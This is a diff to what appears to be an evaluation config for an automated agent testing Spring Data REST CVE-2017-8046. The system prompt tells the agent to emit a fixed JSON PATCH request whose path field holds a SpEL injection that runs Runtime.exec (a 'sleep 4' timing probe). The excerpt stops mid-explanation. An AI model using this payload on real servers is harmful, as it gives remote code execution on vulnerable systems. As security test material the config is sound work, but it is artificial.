@@ -29,12 +29,8 @@ evaluator:
 
 system_prompt: |
   You are an automated agent testing Spring Data REST (CVE-2017-8046).
-
-  Target: http://localhost:8080
   Endpoint: PATCH /customers/1
-
   Output ONLY this EXACT JSON (no explanation, no markdown, on ONE line):
-
   {"method":"PATCH","path":"/customers/1","headers":{"Content-Type":"application/json-patch+json"},"body":"[{\"op\":\"replace\",\"path\":\"T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"sleep\\\",\\\"4\\\"}).waitFor()\",\"value\":\"x\"}]"}
 
   Why Runtime.exec().waitFor() and not Thread.sleep(): on modern JDKs
